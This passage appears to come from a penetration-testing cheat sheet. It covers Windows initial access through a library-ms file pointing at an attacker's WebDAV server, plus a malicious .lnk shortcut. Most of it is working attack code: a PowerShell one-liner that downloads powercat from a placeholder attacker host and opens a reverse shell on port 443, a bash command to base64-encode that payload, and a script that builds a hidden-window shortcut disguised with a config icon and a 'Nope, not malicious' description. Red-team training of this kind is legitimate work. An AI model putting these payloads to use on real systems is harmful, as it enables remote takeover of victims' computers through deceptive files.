      <!-- not documented in Microsoft Documentation webpage; used for compatibility -->
      <isSupported>false</isSupported>
      <!-- the location, our WebDAV URL -->
      <simpleLocation>
        <url>http://ATTACKER_IP:8000</url>  <!-- <===== CHANGE ME!!!!! -->
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

From here must create a malicious `.lnk` file that starts a reverse shell using a payload like the following as the link target:

```powershell
powershell -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell"
```

If you want to base64 encode the above PowerShell payload, you may run into a character limit in the Windows shortcut GUI. It can only create a shortcut with 259 characters in the Target + Arguments fields, but you can use PowerShell to make more robust shortcuts, with longer payloads.

To generate the base64 payload, I recommend using my [`mkpowercat.py`](tools/mkpowercat.py) script.

```sh
# use my mkpowercat script
./mkpowercat.py

# manually convert to base64 (replace LISTEN_IP)
lhost=LISTEN_IP;echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p 443 -e powershell" | iconv -t UTF-16LE | base64 | tr -d '\n';echo
```

Insert base64 payload and run on windows to create malicious `.lnk` file:

```powershell
# make a custom malicious shortcut
$path                      = "$([Environment]::GetFolderPath('Desktop'))\automatic_configuration.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "%SystemRoot%\System32\imageres.dll,63" # app config icon

$shortcut.TargetPath       = "powershell.exe"
$shortcut.Arguments        = "-nop -ep bypass -w hidden -e BASE64PAYLOADHERE"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "" # can set to some hotkey combo like CTRL+C
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()
# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
```

References:

- [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)

